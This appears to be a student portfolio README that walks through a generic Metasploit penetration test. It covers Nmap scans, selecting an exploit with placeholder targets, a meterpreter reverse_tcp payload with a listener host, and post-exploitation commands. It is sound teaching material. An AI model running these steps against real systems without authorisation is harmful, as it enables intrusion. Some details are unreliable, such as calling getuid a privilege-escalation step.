# Metasploit Testing

## Objective

The Metasploit testing project aimed to provide a comprehensive understanding of penetration testing using the Metasploit Framework. This involved setting up various environments, exploiting vulnerabilities, and demonstrating the importance of ethical hacking practices. The hands-on experience was designed to equip participants with the skills necessary to identify, exploit, and mitigate security risks in real-world applications.

### Skills Learned

- Penetration Testing Methodologies: Gained in-depth knowledge of methodologies and principles of ethical hacking.
- Metasploit Proficiency: Developed proficiency in using the Metasploit Framework for vulnerability assessment and exploitation.
- Reconnaissance and Footprinting: Acquired abilities to perform reconnaissance on target systems using Nmap.
- Scripting and Automation: Enhanced skills in scripting and automation for effective security testing.
- Post-Exploitation Techniques: Understood post-exploitation techniques and methods for maintaining access.

### Tools Used

- Metasploit Framework for exploitation and payload generation.
- Nmap for network mapping and vulnerability scanning.
- Burp Suite for web application security testing.
- Various operating systems (Kali Linux, Windows) for testing environments.

## Steps

### 1. Environment Setup
- Installed Kali Linux and configured.
- Install Metasploit:
   - ```bash
      sudo apt update
      sudo apt install metasploit-framework

---

### 2. Reconnaissance
- Utilized Nmap to identify open ports and services on the target machine.
- Basic Nmap Scan Command:
  ```bash
  nmap -sS -p- <target-ip>
  ```
  - Conducts a stealth SYN scan.
  ```bash
  -sS
  ```
  - Scans all 65535 ports.
  ```bash
  -p
  ```
  
- Service Version Detection:
  ```bash
  nmap -sV <target-ip>

---

### 3. Exploitation
Executed a vulnerability exploit using Metasploit against the target machine.
- Start Metasploit Framework:
  ```bash
  msfconsole
  
- Search for available exploits:
  ```bash
  search <service-name>

- Use a specific exploit:
  ```bash
  use exploit/multi/http/<exploit-name>

- Set the target options:
  ```bash
  set RHOST <target-ip>
  set RPORT <target-port>

- Set the payload options (example for reverse shell):
  ```bash
  set PAYLOAD linux/x86/meterpreter/reverse_tcp
  set LHOST <your-ip>
  set LPORT <your-port>

- Execute the exploit:
  ```bash
  exploit


---

### 4. Post-Exploitation
Once you gain access, use Meterpreter commands. 
- To escalate privileges:
  ```bash
  getuid
  ```
- To explore the file system:
  ```bash
  ls
  cd <directory>
  ```

- To capture a screenshot:
  ```bash
  screenshot


---

### 5. Reporting
Compiled findings into a professional report detailing vulnerabilities discovered and remediation steps.

- Example report:
  ```bash
  Vulnerability Summary
  | Vulnerability         | Description                         | Remediation                       |
  |-----------------------|-------------------------------------|-----------------------------------|
  | Open Port             | Port 80 is open                     | Disable unneeded services         |
  | Vulnerable Service    | Apache version vulnerable to CVE-X  | Upgrade Apache to latest version  |

## Conclusion

The use of industry-standard tools such as Metasploit, Nmap, and Burp Suite not only enhanced my technical proficiency but also deepened my understanding of the attack lifecycle. This experience has prepared me to approach real-world security challenges with a systematic and informed mindset.

Moreover, the ability to document findings and communicate risks effectively is essential in the cybersecurity field. This project underscored the importance of producing clear and actionable reports that can guide organizations in improving their security posture.
